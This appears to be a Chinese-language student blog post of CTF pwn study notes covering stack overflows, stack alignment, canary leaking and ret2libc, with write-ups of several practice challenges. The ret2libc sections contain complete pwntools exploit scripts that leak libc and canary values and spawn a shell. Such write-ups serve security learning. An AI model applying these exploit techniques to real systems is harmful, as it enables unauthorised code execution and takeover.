---
title: "栈溢出与 ret2libc"
date: 2025-05-10
categories:
  - 二进制安全
  - 栈溢出
tags:
  - pwn
  - stack-overflow
  - ret2libc
---

## 学习的东西
这就相当于把这周学的总结一下吧

### 栈溢出
首先学了简单的栈溢出，知道了它这个是发送无用数据来控制栈的。就是覆盖函数的返回地址，然后就能跳转到想跳转的地方。先填入距离返回地址的距离，再填返回地址。记得要填那个指针的64位是0x8，32位是0x4

### 栈对齐
然后是这个栈对齐。原理没怎么弄懂，就知道加一个ret_gadget就能避免这种情况了。查地址的话用ROPgadget查 后面加 | grep ':ret' 。这个资料里应该讲的是原理，https://blog.csdn.net/qq_29912475/article/details/134862329?sharetype=blog&shareId=134862329&sharerefer=APP&sharesource=2504_91251847&sharefrom=link 以后应该就懂了。

### 没有这个bin/sh的时候怎么办
第三题没有这个bin/sh，最后栈溢出的时候返回不了。想办法写入到某个地方，要不然就劫持不了栈。查了资料说这个一般写到bss的位置。（全局变量，可以读写。资料上这么说的）

查bss的时候用readelf -S 查，发现是那个地址带进ida找一下对应的是哪个函数，就把bin/sh写到对应的函数里。

精准发送的话用p.recvuntil(''),前面加b改成字节，注意最后写入的时候要弄一个\x00，终止字符串。

### canary保护
网上说这是金丝雀保护。应该主要有三种方法，canary泄露，说有覆盖截断字符和格式化字符串（直接把栈的内容打印出来）。和canary爆破。这个爆破还不是很清楚，就只知道它就是一个一个试试出来的（所以才叫爆破吧）。然后就只会最简单的，canary泄露里的。先泄露canary,然后再用正确的栈溢出。

## ret2text1
先用ida看一下代码,可以从main函数里看到，它调用了一个overflow函数，可能会产生危险。F5反编译看一下main，fun和overflow函数。（之前用gdb调了好多遍出现了提示overflow的，没算出来偏移量，拿ida看的）。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530502097-622d0e63-7b36-436e-884f-0c396e2eee0b.png)

overflow里有get危险函数，fun里有/bin/sh。看一下上面的rbp,overflow的是20,感觉把这个填满再填一个就能栈溢出了。（但是实际上还需要覆盖rbp，在尝试中发现不覆盖运行不了。64位中覆盖rbp需要8个字节，32位中需要4个。所以最后发送攻击数据的时候是0x28）

编写一下攻击的代码试一下。

编写的时候要绑定对应的配置文件，然后payload的时候要转换成16进制（加b）。然后要加上fun函数里push那一段的地址。（在伪代码里看一下）


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530502304-03f6f17f-5e40-4c1e-b5f3-0a24fd114865.png)

在虚拟机上python3 attack.py 运行一下。提示完了之后 ls 一下，给出了这像清单一样的东西。这就拿到了shell.

## ret2text2
先checksec 这个题.发现没有这个canary,64位程序。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530502172-7748c47e-6334-4614-878b-1d4447820253.png)

再把题目拿ida分析一下，可以看到出现了backdoor后门函数。确定了地址。再看main函数，调用了vuln和put函数。先看一下vuln函数，里面出现了read危险函数。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530502103-299cc429-20c5-4963-8a34-73e173f8bc4d.png)

再看一下反编译的，rbp是100。加上那个指针8就是108，基本上就可以编写攻击的python了。再拿gdb调试一下看一下。可以看到也是一样的。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530502115-43010bd2-2714-4042-9f77-d5b4f972d319.png)

然后写一下python。前几次写的是这个，运行之后就报EOF，再ls之后出现了这个


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530503364-000f07c7-26b7-4370-9a2d-24ce263d69c6.png)

栈没有对齐，然后再改一下。看了资料上，先看一下参数。然后它好像要求是16位的，改一下python。加一个ret gadget ,确定一下ret的地址。（用这个ROPgadget直接查一下），再改一下代码。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530503459-412319e2-f1ad-4b4f-b629-39914ed2a0d5.png)


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530503577-37e94595-e69b-4c33-97d7-e5a8b4ba641f.png)

改一下，分开写


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530503493-fb3934e8-88e9-46f9-b36b-e553ac6a1011.png)

运行试一下，没问题。发现就是栈没对齐导致payload没弄好。

## ret2text3
先checksec 有32位文件，有nx保护。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530503446-7eba78a7-2dba-4154-a62e-8bb25ed45c66.png)

再拿ida看一下这个。两次read,第一次0x100，让读256个字节，但是它这个char buf这缓冲区只让读28个，就是后面那个ebp-0x1c。有那个栈溢出。覆盖了buf缓冲区就可以。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530503918-64e85f21-24e6-41e8-b8ac-3875408fed79.png)

看一下后门那个bin/sh，发现没有bin/sh，只有一个system.就把bin/sh的弄到buf里，写到第一次read的buf里。(可以用readelf -S 直接查一下bss在哪，找到对应的地址发现那个buf 就在第一次read的buf，所以buf可以写入 bin/sh 作为那个载荷。)


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530504142-440fb031-8c7f-4ef9-8719-146d01c0f7fc.png)


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530504212-8874c7f5-8ae6-41f9-b3ce-5c325893f77a.png)

定位的话用一下那个recvuntil，读取到那个对应的name提示那把bin/sh弄进去。发送的时候还是用sendline(b' ')最后要加上空字节\x00,终止字符串，然后对应的payload也要加上system,返回地址，传递的bin/sh的地址，即这个参数buf.写一下python。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530504370-28c7ba21-e79e-4d9c-88c6-93e914d1e9ed.png)

试一下，可以了。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530504296-afb79302-7d3d-4b61-a040-77395dc4e8ee.png)

## ret2text4
## ret2libc1
这是一道普通的libc题，需要掌握一下基本的套路。

首先看checksec 有nx，ida里看也没有bin/sh。确定一下这是一道libc题。

然后这个rdi可以用这个看一下

```bash
ROPgadget --binary ret2libc1 --only "pop|ret" |grep  'rdi'
```

看出来rdi的地址

ret:

```bash
ROPgadget --binary ./rip --only "ret"
```

## rdi
rdi是用来传参的。一般是rdi +system +bin/sh

rdi是把bin/sh的地址传给system

知道了这个libc题以后先泄露 puts 的真正地址先发送无用数据构造链。数据到rdi，got和plt表里面。最后是主函数的地址（涉及到了64位程序传参的问题，如果是32位的话就不需要，只用got和plt还有main的起始地址就可以）

有一篇文章确实讲的不错

[pwn入门：基本栈溢出之ret2libc详解（以32位+64位程序为例）-CSDN博客](https://blog.csdn.net/Bossfrank/article/details/134872403)

注意发送数据的时候要发对。第一个在“overflow” 后面，发完到“win”再接收

然后再输出打印一下puts的真正地址，再用u64,转换为无符号整数

```plain
puts_real_addr = u64(p.recv(6).ljust(8, b'\x00'))
```

接收6字节，转化为8字节

确定以后再计算，运用公式，基地址=真实地址-偏移地址

```plain
libc_base = puts_real_address -libc.sym['puts']
```

有了基地址，就可以算出system和bin/sh的地址(就是基地址加上偏移量就是system和bin/sh的绝对地址。bin/sh的写法不同，它要搜索一个“bin/sh”字符串，然后返回生成器。next是获取第一个匹配项的偏移量)

```plain
system_address = libc_base + libc.sym['system']
binsh_address = libc_base + next(libc.search(b"/bin/sh"))
```

然后再构造rop链，攻击注意栈对齐，按照以前方法，payload里要加一个ret的地址。

查找的话用(查出来选一个只有ret的用)

```plain
ROPgadget --binary ret2libc1  |grep 'ret'
```

最后发送的时候对齐+rdi+bin/sh+sysytem,按照之前的溢出的偏移量发送。

```plain
payload += p64(0x400506)# stack alignment
```

完整的代码：

```python
from pwn import*

context(arch='amd64', os='linux', log_level='debug')  
e =ELF("./ret2libc1")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=process("./ret2libc1")
#p=remote('27.25.151.26',46071)

rdi_address = 0x400743
puts_plt = e.plt['puts']
puts_got = e.got['puts'] 
main_address =0x400632

payload = b'A'*(0x40+8)
payload += p64(rdi_address)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_address)

p.recvuntil(b"Do you know how to do buffer overflow?")

p.send(payload)
p.recvuntil(b'win\n') 
puts_real_address = u64(p.recv(6).ljust(8,b'\x00'))
print("puts_real_address: ",hex(puts_real_address))

libc_base = puts_real_address -libc.sym['puts']
system_address = libc_base + libc.sym['system']
binsh_address = libc_base + next(libc.search(b"/bin/sh"))

payload = b"A"*(0x40+8)
payload += p64(0x400506)# stack alignment
payload += p64(rdi_address)
payload += p64(binsh_address)
payload += p64(system_address)

p.sendline(payload)
p.interactive()
```

## ret2libc2
看一下这道题，它这个开了canary保护


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530504740-0b10fbd5-38bf-4ca2-91d3-d0cf9d781d99.png)

要用那个泄露canary的方法泄露。

有了libc1的公式这道题分析完之后，发现的结果就是在libc1的基础上添加绕过cacary的片段就可以。（ida看完也差不多，就多了画黄线的）


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530504841-1d2d1cc1-3d13-4b88-bded-83175f34e88b.png)

原来的代码基本不变。然后添加canary对应的部分。

```python
p.sendlineafter(b'overflow?\n',b'A'*(0x50 - 9) + b'a')
p.recvuntil(b"Aa")

canary = u64(p.recv(8).ljust(8,b'\x00'))-0x0a
print('canary:', hex(canary))
```

记得要在payload里添加攻击canary的代码（先发canary的，让canary泄露了后面的才能继续）

```plain
payload += p64(canary) 
payload += b'c' * 8
```

泄露canary的地址想着套用模板了，用read函数打印出来。然后用这个sendline泄露的时候要减去0x0a（之前好像看过一篇泄露的文章说最后要减一个。应该是这篇，最后讲爆破的时候注释的。也没看懂这篇文章介绍的方法）

https://blog.csdn.net/ysy___ysy/article/details/142214229

基本上就是这。这个plt和pot表里的函数都还能像上一道题一样照着用（居然还都能用puts），不用改。

完整的代码：

```python
from pwn import*

e = ELF("./ret2libc2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=process("./ret2libc2")

p.sendlineafter(b'overflow?\n',b'A'*(0x50 - 9) + b'a')
p.recvuntil(b"Aa")

canary = u64(p.recv(8).ljust(8,b'\x00'))-0x0a
print('canary:', hex(canary)) 

rdi_address = 0x400863
puts_plt = e.plt['puts']
puts_got = e.got['puts'] 
main_address =0x400789

payload = b'A'*(0x50-8) 
payload += p64(canary) 
payload += b'c' * 8 
payload += p64(rdi_address)
payload += p64(puts_got) 
payload += p64(puts_plt)
payload += p64(main_address)

p.sendlineafter(b'harder!',payload)

p.recvuntil(b'win\n') 
puts_real_address = u64(p.recv(6).ljust(8,b'\x00'))
print("puts_real_address: ",hex(puts_real_address))

libc_base = puts_real_address -libc.sym['puts']
system_address = libc_base + libc.sym['system']
binsh_address = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a'*(0x50-8)
payload += p64(canary)
payload += b'c' * 8
payload += p64(0x40059e )# stack alignment
payload += p64(rdi_address)
payload += p64(binsh_address)
payload += p64(system_address)
p.recvuntil(b"Do you know how to do buffer overflow?\n")
p.sendline(b'\x00')
p.recvuntil(b"harder!")
p.sendline(payload)
p.interactive()
```